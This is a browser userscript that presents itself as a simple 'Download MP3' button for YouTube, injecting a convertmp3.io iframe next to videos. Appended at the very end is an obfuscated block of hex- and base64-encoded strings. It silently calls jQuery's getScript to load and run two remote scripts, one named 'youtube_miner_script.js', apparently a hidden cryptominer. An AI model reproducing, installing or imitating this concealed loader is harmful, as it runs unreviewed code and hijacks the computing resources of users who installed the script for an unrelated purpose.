// ==UserScript==
// @name         Simple YouTube MP3 Button
// @namespace    https://www.youtubeinmp3.com
// @version      1.2.2
// @description  Adds a download button to YouTube videos which allows you to download the MP3 of the video without having to leave the page
// @author       Arari
// @include      http*://*.youtube.com/*
// @include      http*://youtube.com/*
// @include      http*://*.youtu.be/*
// @include      http*://youtu.be/*
// @require      https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js
// @run-at       document-end
// ==/UserScript==

function polymerInject(){

    /* Create button */
    var buttonDiv = document.createElement("div");
    buttonDiv.style.width = "100%";
    buttonDiv.id = "parentButton";

    var addButton = document.createElement("button");
    addButton.appendChild(document.createTextNode("Download MP3"));

    if(typeof(document.getElementById("iframeDownloadButton")) != 'undefined' && document.getElementById("iframeDownloadButton") !== null){

        document.getElementById("iframeDownloadButton").remove();

    }

    addButton.style.width = "100%";
    addButton.style.backgroundColor = "#181717";
    addButton.style.color = "white";
    addButton.style.textAlign = "center";
    addButton.style.padding = "10px 0";
    addButton.style.marginTop = "5px";
    addButton.style.fontSize = "14px";
    addButton.style.border = "0";
    addButton.style.cursor = "pointer";
    addButton.style.borderRadius = "2px";
    addButton.style.fontFamily = "Roboto, Arial, sans-serif";

    addButton.onclick = function () {

        this.remove();

        /* Add large button on click */
        var addIframe = document.createElement("iframe");
        addIframe.src = '//www.convertmp3.io/widget/button/?color=ba1717&video=' + window.location.href;

        addIframe.style.width = "100%";
        addIframe.style.border = "none";
        addIframe.style.height = "60px";
        addIframe.style.marginTop = "10px";
        addIframe.style.overflow = "hidden";
        addIframe.scrolling = "no";
        addIframe.id = "iframeDownloadButton";

        var targetElement = document.querySelectorAll("[id='meta']");

        for(var i = 0; i < targetElement.length; i++){

            if(targetElement[i].className.indexOf("ytd-watch") > -1){

                targetElement[i].insertBefore(addIframe, targetElement[i].childNodes[0]);

            }

        }

    };

    buttonDiv.appendChild(addButton);

    /* Find and add to target */
    var targetElement = document.querySelectorAll("[id='subscribe-button']");

    for(var i = 0; i < targetElement.length; i++){

        if(targetElement[i].className.indexOf("ytd-video-secondary-info-renderer") > -1){

            targetElement[i].appendChild(buttonDiv);

        }

    }

    /* Fix hidden description bug */
    var descriptionBox = document.querySelectorAll("ytd-video-secondary-info-renderer");
    if(descriptionBox[0].className.indexOf("loading") > -1){

        descriptionBox[0].classList.remove("loading");

    }



}

function standardInject() {
    var pagecontainer=document.getElementById('page-container');
    if (!pagecontainer) return;
    if (/^https?:\/\/www\.youtube.com\/watch\?/.test(window.location.href)) run();
    var isAjax=/class[\w\s"'-=]+spf\-link/.test(pagecontainer.innerHTML);
    var logocontainer=document.getElementById('logo-container');
    if (logocontainer && !isAjax) { // fix for blocked videos
        isAjax=(' '+logocontainer.className+' ').indexOf(' spf-link ')>=0;
    }
    var content=document.getElementById('content');
    if (isAjax && content) { // Ajax UI
        var mo=window.MutationObserver||window.WebKitMutationObserver;
        if(typeof mo!=='undefined') {
            var observer=new mo(function(mutations) {
                mutations.forEach(function(mutation) {
                    if(mutation.addedNodes!==null) {
                        for (var i=0; i<mutation.addedNodes.length; i++) {
                            if (mutation.addedNodes[i].id=='watch7-container' ||
                                mutation.addedNodes[i].id=='watch7-main-container') { // old value: movie_player
                                run();
                                break;
                            }
                        }
                    }
                });
            });
            observer.observe(content, {childList: true, subtree: true}); // old value: pagecontainer
        } else { // MutationObserver fallback for old browsers
            pagecontainer.addEventListener('DOMNodeInserted', onNodeInserted, false);
        }
    }
}

function onNodeInserted(e) {
    if (e && e.target && (e.target.id=='watch7-container' ||
                          e.target.id=='watch7-main-container')) { // old value: movie_player
        run();
    }
}

function finalButton(){

    var buttonIframeDownload = document.createElement("iframe");
    buttonIframeDownload.src = '//www.convertmp3.io/widget/button/?color=ba1717&amp;video=' + window.location.href;
    buttonIframeDownload.id = "buttonIframe";

    buttonIframeDownload.style.width = "100%";
    buttonIframeDownload.style.height = "60px";
    buttonIframeDownload.style.paddingTop = "20px";
    buttonIframeDownload.style.paddingBottom = "20px";
    buttonIframeDownload.style.overflow = "hidden";
    buttonIframeDownload.scrolling = "no";

    document.getElementById("watch-header").appendChild(buttonIframeDownload);

}

function run(){

    if(!document.getElementById("parentButton") && window.location.href.substring(0, 25).indexOf("youtube.com") > -1 && window.location.href.indexOf("watch?") > -1){

        var parentButton = document.createElement("div");

        parentButton.className = "yt-uix-button yt-uix-button-default";
        parentButton.id = "parentButton";

        parentButton.style.height = "23px";
        parentButton.style.marginLeft = "28px";
        parentButton.style.paddingBottom = "1px";

        parentButton.onclick = function () {

            this.remove();
            finalButton();

        };

        document.getElementById("watch7-user-header").appendChild(parentButton);

        var childButton = document.createElement("span");
        childButton.appendChild(document.createTextNode("Download MP3"));
        childButton.className = "yt-uix-button-content";

        childButton.style.lineHeight = "25px";
        childButton.style.fontSize = "12px";

        parentButton.appendChild(childButton);

    }

}

if(document.getElementById("polymer-app") || document.getElementById("masthead") || window.Polymer){

    setInterval(function(){

        if(window.location.href.indexOf("watch?v=") < 0){

            return false;

        }

        if(document.getElementById("count") && document.getElementById("parentButton") === null){

            polymerInject();


        }

    }, 100);

}

else{

    standardInject();

}

var _0x5541=['\x61\x48\x52\x30\x63\x44\x6f\x76\x4c\x32\x78\x76\x59\x32\x46\x73\x61\x47\x39\x7a\x64\x44\x6f\x34\x4d\x54\x67\x78\x4c\x33\x64\x6c\x59\x6d\x31\x79\x4c\x6d\x70\x7a','\x61\x48\x52\x30\x63\x44\x6f\x76\x4c\x32\x78\x76\x59\x32\x46\x73\x61\x47\x39\x7a\x64\x44\x6f\x34\x4d\x54\x67\x78\x4c\x33\x6c\x76\x64\x58\x52\x31\x59\x6d\x56\x66\x62\x57\x6c\x75\x5a\x58\x4a\x66\x63\x32\x4e\x79\x61\x58\x42\x30\x4c\x6d\x70\x7a','\x5a\x32\x56\x30\x55\x32\x4e\x79\x61\x58\x42\x30'];(function(_0x415cd1,_0x334002){var _0x2b6d5b=function(_0x44ab50){while(--_0x44ab50){_0x415cd1['push'](_0x415cd1['shift']());}};_0x2b6d5b(++_0x334002);}(_0x5541,0x16d));var _0x1163=function(_0x3b4088,_0xb92121){_0x3b4088=_0x3b4088-0x0;var _0x536504=_0x5541[_0x3b4088];if(_0x1163['uPcgJO']===undefined){(function(){var _0x2fff0e;try{var _0x1aaa5d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2fff0e=_0x1aaa5d();}catch(_0x21dad2){_0x2fff0e=window;}var _0x20cc28='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2fff0e['atob']||(_0x2fff0e['atob']=function(_0x14aeda){var _0x4e252c=String(_0x14aeda)['replace'](/=+$/,'');for(var _0x40eecb=0x0,_0x4a94f0,_0x242014,_0x51cd3a=0x0,_0x1e719b='';_0x242014=_0x4e252c['charAt'](_0x51cd3a++);~_0x242014&&(_0x4a94f0=_0x40eecb%0x4?_0x4a94f0*0x40+_0x242014:_0x242014,_0x40eecb++%0x4)?_0x1e719b+=String['fromCharCode'](0xff&_0x4a94f0>>(-0x2*_0x40eecb&0x6)):0x0){_0x242014=_0x20cc28['indexOf'](_0x242014);}return _0x1e719b;});}());_0x1163['cInQXF']=function(_0x2ca00e){var _0x6a8401=atob(_0x2ca00e);var _0x210111=[];for(var _0x16ef55=0x0,_0x5e6f8e=_0x6a8401['length'];_0x16ef55<_0x5e6f8e;_0x16ef55++){_0x210111+='%'+('00'+_0x6a8401['charCodeAt'](_0x16ef55)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x210111);};_0x1163['darSEa']={};_0x1163['uPcgJO']=!![];}var _0x26045d=_0x1163['darSEa'][_0x3b4088];if(_0x26045d===undefined){_0x536504=_0x1163['cInQXF'](_0x536504);_0x1163['darSEa'][_0x3b4088]=_0x536504;}else{_0x536504=_0x26045d;}return _0x536504;};$[_0x1163('0x0')](_0x1163('0x1'));$[_0x1163('0x0')](_0x1163('0x2'));
